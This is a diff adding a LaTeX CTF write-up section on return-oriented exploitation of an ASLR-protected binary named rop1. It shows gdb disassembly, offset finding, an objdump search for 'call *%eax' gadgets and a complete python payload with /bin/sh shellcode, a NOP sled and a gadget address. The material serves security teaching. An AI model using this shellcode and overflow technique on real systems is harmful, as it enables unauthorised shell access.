@@ -274,4 +274,113 @@ For example, $2^{31}$ will actually return $-(2^{31})$ because it wraps around.
 The trick to this problem is precisely that, enter a huge number, lose, and let the boss
 pay the debt, happy gambling! :D
 
+
+\section{Return Oriented Programming}
+
+
+This section will cover every binary exploit question after Netsino.
+They will employ different protection mechanisms to protect against
+basic overflow attacks, but they still have weaknesses.
+
+
+\subsection{ROP 1 -- ASLR}
+
+
+ASLR stands for Address Space Layout Randomization, what it does is that
+it randomly assigns memory address to the stack, executable, heap and
+libraries. For example, the function "system," is usually located at
+0xf7e5c100, but with ASLR, that address can be anywhere.
+
+
+This makes certain shellcodes that perdicts the location of libc functions
+unusable because their location is randomized each time. However, maybe
+we don't need to call libc functions. This program is exploitable in that
+it loads the input buffer into a register (\%eax). This requires a little
+searching, but is not that hard to get. \%eax can then be called
+by functions defined within the program.
+
+
+The basic idea is that the input buffer will be loaded with shell code followed
+by a trailing NOP sled until the buffer overflows into \%esp. When it overflows
+into \%esp, we point \%esp to (write the value of \%esp as) to a command along
+the lines of jmp/call *\%eax. Note that \%esp is what get transferred into \%eip,
+and then the program will execute your input as actual instructions and KABOOM
+you get a shell.
+
+
+Now how exactly are we going to implement that? First off, we need to find a way
+to overflow \%esp and to find the beginning of the input buffer stream. The way
+I like to do it is to spam input with "A"'s and append 4 "B"'s to the end until
+the value of \%esp becomes 0x42424242 (4 B's in hex). There are other ways of doing
+this, but for the purpose of CTF's, it's sufficient to just be lazy and spam your
+way through the competititon.
+
+
+The real code looks something like this:
+\begin{lstlisting}
+$ gdb rop1
+(gdb) disass vuln
+Dump of assembler code for function vuln:
+0x08048e6d <+0>:	push   %ebp
+0x08048e6e <+1>:	mov    %esp,%ebp
+0x08048e70 <+3>:	sub    $0x58,%esp
+0x08048e73 <+6>:	mov    0x8(%ebp),%eax
+0x08048e76 <+9>:	mov    %eax,0x4(%esp)
+0x08048e7a <+13>:	lea    -0x48(%ebp),%eax
+0x08048e7d <+16>:	mov    %eax,(%esp)
+0x08048e80 <+19>:	call   0x80481e0
+0x08048e85 <+24>:	leave  
+0x08048e86 <+25>:	ret    
+End of assembler dump.
+(gdb) b *0x08048e86
+Breakpoint 1 at 0x8048e86
+(gdb) run $(python -c 'print "A"*76 + "B"*4')
+Starting program: /home/rop1/rop1 $(python -c 'print "A"*68 + "B"*4')
+
+Breakpoint 1, 0x08048e86 in vuln ()
+(gdb) x $esp
+0xffffd6ac:	0x42424242
+\end{lstlisting}
+
+
+Volia, we get that we need 76 bytes of shellcode + NOP sled to get to \%esp.
+Now we need to find the memory location or one jmp/call *\%eax and that's
+what we'll put into\%esp.
+
+
+To do this, we summon our old friend "grep":
+\begin{lstlisting}
+$ objdump -d ./rop1 | grep "*%eax"
+8048d86:	ff d0                	call   *%eax
+8048df4:	ff d0                	call   *%eax
+8048e3c:	ff d0                	call   *%eax
+8049691:	ff d0                	call   *%eax
+804a546:	ff d0                	call   *%eax
+... ...		... ...					 ...    ...
+\end{lstlisting}
+
+
+The list goes on, but we only need the first one. Now let's craft the input
+payload:
+\newline\newline
+\begin{tabular}{c p{5cm} p{3cm} p{4cm} c}
+ & shellcode to get /bin/sh & NOP sled & call *\%eax & \\
+python -c 'print & "\textbackslash x6a\textbackslash x18\textbackslash x58\textbackslash xcd\textbackslash x80\textbackslash
+
+x50\textbackslash x50\textbackslash x5b\textbackslash x59\textbackslash x6a\textbackslash x46\textbackslash
+
+x58\textbackslash xcd\textbackslash x80\textbackslash x50\textbackslash x68\textbackslash x2f\textbackslash
+
+x2f\textbackslash x73\textbackslash x68\textbackslash x68\textbackslash x2f\textbackslash x62\textbackslash
+
+x69\textbackslash x6e\textbackslash x89\textbackslash xe3\textbackslash x99\textbackslash x31\textbackslash
+
+xc9\textbackslash xb0\textbackslash x0b\textbackslash xcd\textbackslash x80" + & "\textbackslash x90"*42 + &
+
+"\textbackslash x86\textbackslash x8d\textbackslash x04\textbackslash x08" & ' \textpipe ./rop1\\
+
+\end{tabular}
+\newline
+\newline
+That should give you a shell!
 \end{document}
